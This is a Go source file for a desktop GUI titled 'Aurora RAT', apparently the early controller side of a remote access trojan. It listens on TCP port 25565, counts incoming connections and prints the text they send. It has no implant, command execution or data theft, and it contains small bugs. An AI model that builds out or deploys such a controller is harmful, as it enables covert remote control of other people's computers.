package main

import (
	"github.com/dontpanic92/wxGo/wx"
	"strconv"
	"fmt"
	"net"
	"runtime"
	"bufio"
)

var a Aurora
var app *AuroraFrame

type Aurora struct {
	// ln is shortened "listener"
	ln net.Listener

	// cl is shortened "currently listening"
	cl bool
}

func newAurora() Aurora {
	self := Aurora{}
	self.cl = false

	return a
}


type AuroraFrame struct {
	wx.Frame
	statusbar wx.StatusBar
	toolbar   wx.ToolBar
	menubar   wx.MenuBar

	menuItemListen wx.MenuItem

	listenBtn    wx.Button

	liveConns int
}

func main() {

	a = newAurora()

	app = newFrame()

	wx1 := wx.NewApp()
	app.Show()
	wx1.MainLoop()
	app.Destroy()
}

// Aurora GUI Functions

func newFrame() *AuroraFrame {
	self := &AuroraFrame{}

	self.liveConns = 0

	self.Frame = wx.NewFrame(wx.NullWindow, -1, "Aurora RAT", wx.DefaultPosition, wx.NewSizeT(800, 600))
	bSizer := wx.NewBoxSizer(wx.VERTICAL)

	self.menubar = wx.NewMenuBar()

	self.statusbar = self.CreateStatusBar()
	self.statusbar.SetStatusText("Not Currently Listening.")

	self.statusbar.SetCanFocus(false)

	self.statusbar.SetFieldsCount(2)
	self.statusbar.SetStatusText("Live Connections: " + strconv.Itoa(self.liveConns), 1)


	menuFile := wx.NewMenu()
	self.menuItemListen = wx.NewMenuItem(menuFile, wx.ID_ANY, "&Start Listening", "Start Listening", wx.ITEM_NORMAL)
	menuFile.Append(self.menuItemListen)

	self.menubar.Append(menuFile, "&File")
	self.SetMenuBar(self.menubar)

	wx.Bind(self, wx.EVT_MENU, eventSetListening, self.menuItemListen.GetId())
	self.SetSizer(bSizer)
	self.Layout()

	return self
}

func eventSetListening(e wx.Event) {

	liveConns := make(chan int)

	go setListening(liveConns)
	go updateLiveConnections(liveConns)
}

func updateLiveConnections(liveConns chan int) {
	for i := range liveConns {
		app.liveConns += i
		app.statusbar.SetStatusText("Live Connections: " + strconv.Itoa(app.liveConns), 1)
	}

}

// Aurora Backend Functions

func setListening(liveConns chan int) {

	ln := make(chan bool)

	go a.SetListening(ln, liveConns);

	listening := <- ln

	if listening == true {
		app.statusbar.SetStatusText("Currently Listening.")
		app.menuItemListen.SetItemLabel("Stop Listening")
		wx.MessageBox("Started Listening.")
	} else {
		app.statusbar.SetStatusText("Not Currently Listening.")
		app.menuItemListen.SetItemLabel("Start Listening")
		wx.MessageBox("Stopped Listening.")
	}
}

func (a *Aurora) SetListening(cln chan bool, liveConns chan int) bool {
	a.cl = !a.cl
	switch a.cl {
	case false:
		if err := a.ln.Close(); err != nil {
			fmt.Println(err)
		}
		break
	case true:
		go a.startListening(liveConns)
		break
	}

	cln <- a.cl
	close(cln)

	return a.cl
}

func (a *Aurora) startListening(liveConns chan int) {

	var err error

	a.ln, err = net.Listen("tcp", ":25565")

	if err != nil {
		fmt.Println(err)
	}

	for {
		if !a.cl {
			runtime.Goexit()
		}

		conn, err := a.ln.Accept()

		if err != nil {
			fmt.Println(err)
		} else if conn != nil {
			liveConns <- 1
			go a.receive(conn, liveConns)
		}

	}
}

func (a *Aurora) receive(conn net.Conn, liveConns chan int) {
	connected := true

	for {
		if !a.cl {
			if connected {
				connected = false
			}
			liveConns <- -1
			runtime.Goexit()
		}

		rw := bufio.NewReadWriter(bufio.NewReader(conn), bufio.NewWriter(conn))
		str, err := rw.ReadString('\\')
		if err != nil {
			if connected{
				connected = false
			}
			liveConns <- -1
			fmt.Println(err)
			runtime.Goexit()
		}
		rw.Flush()
		fmt.Println(str)
	}
}